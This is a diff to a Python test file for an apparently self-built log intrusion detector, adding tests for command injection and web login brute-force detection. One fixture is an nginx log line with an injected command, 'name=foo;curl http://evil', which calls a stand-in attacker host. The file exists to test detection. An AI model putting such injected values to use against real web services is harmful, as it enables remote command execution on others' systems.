@@ -6,6 +6,7 @@ from security.detector import (
     detect_recon_probe,
     detect_ssh_bruteforce,
     detect_ssh_invalid_user,
+    detect_web_login_abuse,
     detect_web_attack,
 )
 from config import load_config
@@ -20,7 +21,7 @@ def test_ssh_brute_force_below_threshold(detector):
     for i in range(2):
         result = detector.check_log({
             "source": "auth",
-            "line": f"Failed password for root from 10.0.0.1 port 22 ssh2",
+            "line": "Failed password for root from 10.0.0.1 port 22 ssh2",
             "file": "/var/log/auth.log"
         })
         if result:
@@ -96,6 +97,16 @@ def test_path_traversal_detection(detector):
     assert result["type"] == "path_traversal"
 
 
+def test_command_injection_detection(detector):
+    result = detector.check_log({
+        "source": "nginx",
+        "line": '10.0.0.5 - - "GET /cgi-bin/test?name=foo;curl http://evil HTTP/1.1" 200',
+        "file": "/var/log/nginx/access.log"
+    })
+    assert result is not None
+    assert result["type"] == "command_injection"
+
+
 def test_sensitive_path_probe_detection(detector):
     result = detector.check_log({
         "source": "nginx",
@@ -114,6 +125,19 @@ def test_scanner_probe_detection(detector):
     })
     assert result is not None
     assert result["type"] == "scanner_probe"
+
+
+def test_web_login_bruteforce_detection(detector):
+    result = None
+    for _ in range(5):
+        result = detector.check_log({
+            "source": "nginx",
+            "line": '10.0.0.20 - - [29/Mar/2026:22:10:00 +0000] "POST /wp-login.php HTTP/1.1" 401 123 "-" "Mozilla/5.0"',
+            "file": "/var/log/nginx/access.log",
+        })
+    assert result is not None
+    assert result["type"] == "web_login_bruteforce"
+    assert result["severity"] == "high"
 
 def test_normal_log_no_detection(detector):
     result = detector.check_log({
@@ -210,6 +234,23 @@ def test_detect_recon_probe_as_pure_function():
     assert sensitive_result["type"] == "sensitive_path_probe"
     assert scanner_result is not None
     assert scanner_result["type"] == "scanner_probe"
+
+
+def test_detect_web_login_abuse_as_pure_function():
+    login_attempts: dict[str, list[int]] = {}
+    result = None
+    for ts in (100, 110, 120, 130, 140):
+        result = detect_web_login_abuse(
+            '10.0.0.21 - - [29/Mar/2026:22:10:00 +0000] "POST /login HTTP/1.1" 403 123 "-" "Mozilla/5.0"',
+            login_attempts=login_attempts,
+            enabled=True,
+            threshold=5,
+            window=120,
+            now=ts,
+        )
+    assert result is not None
+    assert result["type"] == "web_login_bruteforce"
+    assert result["source_ip"] == "10.0.0.21"
 
 
 def test_detect_port_scan_as_pure_function():
